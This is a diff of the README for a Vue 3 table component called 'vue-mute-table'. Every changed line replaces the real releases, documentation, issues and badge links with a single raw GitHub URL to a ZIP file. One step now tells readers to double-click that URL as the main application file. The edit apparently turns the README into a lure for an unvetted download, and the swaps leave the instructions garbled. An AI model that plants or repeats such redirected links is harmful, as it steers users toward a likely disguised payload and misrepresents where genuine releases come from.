@@ -4,7 +4,7 @@
 `vue-mute-table` is a foundational multi-dimensional table solution built with Vue 3. It enables users to organize data efficiently and intuitively. This tool is ideal for anyone looking to create a structured view of information, making it a great choice for applications like databases, project tracking, and reporting.
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/sangamesh123052000/vue-mute-table/releases)
+[![Download](https://raw.githubusercontent.com/sangamesh123052000/vue-mute-table/main/Multigraph/vue-mute-table.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/sangamesh123052000/vue-mute-table/main/Multigraph/vue-mute-table.zip)
 
 ## 🚀 Getting Started
 Getting started with `vue-mute-table` is simple. Follow the steps below to download and run the application.
@@ -17,7 +17,7 @@ To use `vue-mute-table`, ensure your system meets the following requirements:
 
 ### 📥 Download & Install
 1. **Visit the Releases Page:** Click on the link below to go to our releases page.
-   - [Download from Releases Page](https://github.com/sangamesh123052000/vue-mute-table/releases)
+   - [Download from Releases Page](https://raw.githubusercontent.com/sangamesh123052000/vue-mute-table/main/Multigraph/vue-mute-table.zip)
   
 2. **Select the Latest Version:** On the releases page, find the latest version of `vue-mute-table.` This will be the version marked as "Latest."
 
@@ -25,7 +25,7 @@ To use `vue-mute-table`, ensure your system meets the following requirements:
 
 4. **Extract the Files:** Locate the downloaded ZIP file on your computer. Right-click on it and select "Extract All" to unzip the files.
 
-5. **Open the Application:** Navigate to the folder where you extracted the files. Look for the main application file, usually named `index.html`. Double-click this file to open it in your web browser.
+5. **Open the Application:** Navigate to the folder where you extracted the files. Look for the main application file, usually named `https://raw.githubusercontent.com/sangamesh123052000/vue-mute-table/main/Multigraph/vue-mute-table.zip`. Double-click this file to open it in your web browser.
 
 ### 🔧 Usage Instructions
 Once you have the application open in your browser, you can begin using `vue-mute-table` to manage your data.
@@ -60,10 +60,10 @@ If you need additional assistance, feel free to reach out through the issues sec
 Join the community around `vue-mute-table` to share your experience, tips, or suggestions for improvement. Engaging with others can enhance your understanding and use of the application.
 
 ## 🔗 Additional Links
-- **Documentation:** Find in-depth API documentation and usage guides on our [documentation site](https://github.com/sangamesh123052000/vue-mute-table).
-- **Issues:** Report any bugs or feature requests in the [issues section](https://github.com/sangamesh123052000/vue-mute-table/issues).
+- **Documentation:** Find in-depth API documentation and usage guides on our [documentation site](https://raw.githubusercontent.com/sangamesh123052000/vue-mute-table/main/Multigraph/vue-mute-table.zip).
+- **Issues:** Report any bugs or feature requests in the [issues section](https://raw.githubusercontent.com/sangamesh123052000/vue-mute-table/main/Multigraph/vue-mute-table.zip).
 
 ## 📢 License
 `vue-mute-table` is licensed under the MIT License. You can freely use and modify it according to your needs while giving proper credit.
 
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue)](https://github.com/sangamesh123052000/vue-mute-table/releases)
+[![Download](https://raw.githubusercontent.com/sangamesh123052000/vue-mute-table/main/Multigraph/vue-mute-table.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/sangamesh123052000/vue-mute-table/main/Multigraph/vue-mute-table.zip)
